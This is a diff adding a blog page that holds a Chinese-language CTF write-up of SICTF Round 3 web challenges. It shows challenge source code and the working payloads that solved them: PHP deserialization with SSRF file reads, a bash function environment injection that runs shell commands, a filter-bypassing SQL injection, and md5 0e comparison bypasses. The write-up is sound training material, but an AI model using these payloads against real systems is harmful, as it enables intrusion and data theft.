@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="WebEZ_SSRF题目描述: flag位于&#x2F;flag 源码: 1234567891011121314151617181920212223242526272829303132333435&lt;?phphighlight_file(__file__);error_reporting(0);function get($url) &#123;    $curl &#x3D; curl_init();">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SICTF-ROUND-3-web笔记">
+<meta property="og:url" content="http://example.com/2024/02/17/SICTF-ROUND-3-web%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="wm&#39;s blog">
+<meta property="og:description" content="WebEZ_SSRF题目描述: flag位于&#x2F;flag 源码: 1234567891011121314151617181920212223242526272829303132333435&lt;?phphighlight_file(__file__);error_reporting(0);function get($url) &#123;    $curl &#x3D; curl_init();">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2024/02/17/SICTF-ROUND-3-web%E7%AC%94%E8%AE%B0/2.png">
+<meta property="og:image" content="http://example.com/2024/02/17/SICTF-ROUND-3-web%E7%AC%94%E8%AE%B0/3.png">
+<meta property="article:published_time" content="2024-02-17T06:00:06.000Z">
+<meta property="article:modified_time" content="2024-04-26T10:49:54.659Z">
+<meta property="article:author" content="wm">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2024/02/17/SICTF-ROUND-3-web%E7%AC%94%E8%AE%B0/2.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/1.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/1.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/1.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>SICTF-ROUND-3-web笔记</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/02/20/SICTF-ROUND-3-Misc%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/02/04/beginctf2024/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/02/17/SICTF-ROUND-3-web%E7%AC%94%E8%AE%B0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/02/17/SICTF-ROUND-3-web%E7%AC%94%E8%AE%B0/&text=SICTF-ROUND-3-web笔记"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/02/17/SICTF-ROUND-3-web%E7%AC%94%E8%AE%B0/&title=SICTF-ROUND-3-web笔记"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/02/17/SICTF-ROUND-3-web%E7%AC%94%E8%AE%B0/&is_video=false&description=SICTF-ROUND-3-web笔记"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SICTF-ROUND-3-web笔记&body=Check out this article: http://example.com/2024/02/17/SICTF-ROUND-3-web%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/02/17/SICTF-ROUND-3-web%E7%AC%94%E8%AE%B0/&title=SICTF-ROUND-3-web笔记"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/02/17/SICTF-ROUND-3-web%E7%AC%94%E8%AE%B0/&title=SICTF-ROUND-3-web笔记"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/02/17/SICTF-ROUND-3-web%E7%AC%94%E8%AE%B0/&title=SICTF-ROUND-3-web笔记"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/02/17/SICTF-ROUND-3-web%E7%AC%94%E8%AE%B0/&title=SICTF-ROUND-3-web笔记"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/02/17/SICTF-ROUND-3-web%E7%AC%94%E8%AE%B0/&name=SICTF-ROUND-3-web笔记&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/02/17/SICTF-ROUND-3-web%E7%AC%94%E8%AE%B0/&t=SICTF-ROUND-3-web笔记"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#EZ-SSRF"><span class="toc-number">1.1.</span> <span class="toc-text">EZ_SSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Not-just-unserialize"><span class="toc-number">1.2.</span> <span class="toc-text">Not just unserialize</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hacker"><span class="toc-number">1.3.</span> <span class="toc-text">hacker</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Oyst3rPHP"><span class="toc-number">1.4.</span> <span class="toc-text">Oyst3rPHP</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        SICTF-ROUND-3-web笔记
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">wm</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-02-17T06:00:06.000Z" class="dt-published" itemprop="datePublished">2024-02-17</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="EZ-SSRF"><a href="#EZ-SSRF" class="headerlink" title="EZ_SSRF"></a>EZ_SSRF</h2><p>题目描述: flag位于&#x2F;flag</p>
+<p>源码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$curl</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curl</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curl</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">client</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payload</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$url</span> = <span class="string">&quot;http://127.0.0.1/&quot;</span>;</span><br><span class="line">        <span class="variable">$payload</span> = <span class="string">&quot;system(\&quot;cat /flag\&quot;);&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Exploit&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// hint:hide other file</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Harder&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Harder&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You don&#x27;t know how to pass parameters?&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>补充:</strong></p>
+<p>CURLOPT_HEADER  启动时会将头文件的信息作为数据流输出.</p>
+<p>CURLOPT_RETURNTRANSFER  true将curl_exec()获取的信息以字符串返回，而不是直接输出.</p>
+<p>CURLOPT_URL 需要获取的URL地址，也可以在curl_init()初始化会话的时候.<br>dirsearch扫描一下发现:<br><img src="/2024/02/17/SICTF-ROUND-3-web%E7%AC%94%E8%AE%B0/2.png"><br>那就直接读取flag.php文件,构造payload:</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;client&quot;:2:s:&#123;3:&quot;url&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;s:7:&quot;payload&quot;;N;&#125;</span><br></pre></td></tr></table></figure>
+<p>base64解码得到flag:<br>SICTF{4315d9b2-8db9-40a1-8583-a4d49cd62f62}</p>
+<h2 id="Not-just-unserialize"><a href="#Not-just-unserialize" class="headerlink" title="Not just unserialize"></a>Not just unserialize</h2><p>题目描述: 看似平平无奇的反序列化题，出题人却在dockerfile里添加了这样一行奇怪命令：RUN ln -sf &#x2F;bin&#x2F;bash &#x2F;bin&#x2F;sh…</p>
+<p>在某大佬的博客看到对这个题目描述的解释:</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在php中 system()函数调用/bin/sh来执行参数指定的命令，而这个命令的作用是将系统默认的shell解释器从”/bin/sh”更改为”/bin/bash”。所以最后调用的system是bash环境，这样我们可以这样用:  </span><br><span class="line">env $&#x27;BASH_FUNC_echo%%=() &#123; id; &#125;&#x27; bash -c &#x27;echo hello&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>题目源码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$welcome</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$you</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">begin0fweb</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">begin0fweb</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$p</span>=<span class="string">&#x27;hacker!&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;welcome-&gt;you = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$year</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;  Welcome to new year!  &#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable language_">$this</span>-&gt;year);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CR</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$last</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$newyear</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;newyear)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/worries/i&#x27;</span>,<span class="variable">$this</span>-&gt;newyear))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;empty it!&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*(worries).*$/&#x27;</span>,<span class="variable">$this</span>-&gt;newyear)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Don\&#x27;t be worry&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Worries doesn\&#x27;t exists in the new year  &#x27;</span>;</span><br><span class="line">            <span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;last-&gt;worries);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ET</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;get&#x27;</span>] <span class="keyword">as</span> <span class="variable">$inject</span> =&gt; <span class="variable">$rce</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;<span class="subst">&#123;$inject&#125;</span>=<span class="subst">&#123;$rce&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;echo \&quot;Haven&#x27;t you get the secret?\&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;go&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;go&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这题卡在了环境变量注入,参考文章:<br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html</a></p>
+<p>最终payload：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go=Tzo1OiJzdGFydCI6Mjp7czo3OiJ3ZWxjb21lIjtPOjI6IlNFIjoxOntzOjQ6InllYXIiO086MjoiQ1IiOjI6e3M6NDoibGFzdCI7TzoyOiJFVCI6MDp7fXM6NzoibmV3eWVhciI7czo4OiIKd29ycmllcyI7fX1zOjM6InlvdSI7Tjt9&amp;&amp;get[BASH_FUNC_echo%%]=() &#123; cat /f*; &#125;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="hacker"><a href="#hacker" class="headerlink" title="hacker"></a>hacker</h2><p>这题禁用了:<br>order  and  or  like  空格 + ;</p>
+<p>注释说flag在flag表里,考察无列名注入(不需要列名就能得到数据)。<br>构造paload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=joe%27union/**/select/**/b/**/from/**/(select/**/1,2/**/as/**/b/**/union/**/select/**/*/**/from/**/flag)a%23  </span><br></pre></td></tr></table></figure>
+
+<p>注意:这里注释符#需要进行url编码成%23。<br>得到flag: SICTF{aa01372f-0419-4a63-b372-4d19a6596c18}</p>
+<h2 id="Oyst3rPHP"><a href="#Oyst3rPHP" class="headerlink" title="Oyst3rPHP"></a>Oyst3rPHP</h2><p>dirsearch扫描一下目录发现<a target="_blank" rel="noopener" href="http://www.zip泄露,打开index.php文件得到源码/">www.zip泄露,打开index.php文件得到源码</a>:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;RT，一个很简单的Web，给大家送一点分,再送三只生蚝，过年一起吃生蚝哈&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;../Oyster.png&#x27;&quot;</span>.<span class="string">&quot;/&gt;&quot;</span>;</span><br><span class="line">		</span><br><span class="line">        </span><br><span class="line">		<span class="variable">$payload</span> = <span class="title function_ invoke__">base64_decode</span>(@<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line">        <span class="variable">$right</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;left&#x27;</span>];</span><br><span class="line">        <span class="variable">$left</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;right&#x27;</span>];</span><br><span class="line">        </span><br><span class="line">		<span class="variable">$key</span> = (<span class="keyword">string</span>)@<span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$right</span> !== <span class="variable">$left</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$right</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$left</span>))&#123;</span><br><span class="line">            </span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;Congratulations on getting your first oyster&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;../Oyster1.png&#x27;&quot;</span>.<span class="string">&quot;/&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?THINKPHP/is&#x27;</span>, <span class="variable">$key</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;Oysters don&#x27;t want you to eat&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$key</span>, <span class="string">&#x27;603THINKPHP&#x27;</span>) === <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;！！！Oysters don&#x27;t want you to eat！！！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;WOW！！！Congratulations on getting your second oyster&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;../Oyster2.png&#x27;&quot;</span>.<span class="string">&quot;/&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">			@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$payload</span>);</span><br><span class="line">			<span class="comment">//最后一个生蚝在根目录，而且里面有Flag？？？咋样去找到它呢？？？它的名字是什么？？？</span></span><br><span class="line">			<span class="comment">//在源码的某处注释给出了提示，这就看你是不是真懂Oyst3rphp框架咯！！！</span></span><br><span class="line">			<span class="comment">//小Tips：细狗函数┗|｀O′|┛ 嗷~~</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>第一层md5绕过(用数组绕过好像会报错),可以用0e绕过。常规的0e绕过:</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">240610708</span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s214587387a</span><br></pre></td></tr></table></figure>
+<p>这些字符串的 md5 值都是 0e 开头，在 php 弱类型比较中判断为相等。<br>第二层需要用正则回溯来绕过,正则回溯原理:</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.大量的回溯会长时间地占用CPU，从而带来系统性的开销。PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限pcre.backtrack_limit。</span><br><span class="line"></span><br><span class="line">2.我们可以通过var_dump(ini_get(&#x27;pcre.backtrack_limit&#x27;));的方式查看当前环境下的上限，最大回溯次数默认为1000000次，如果超过一百万次preg_match函数返回的既不是1也不是0，而是false表示此次执行失败。</span><br></pre></td></tr></table></figure>
+<p>在这里还学会了用一款工具: phpggc<br>这里写一下它的介绍:</p>
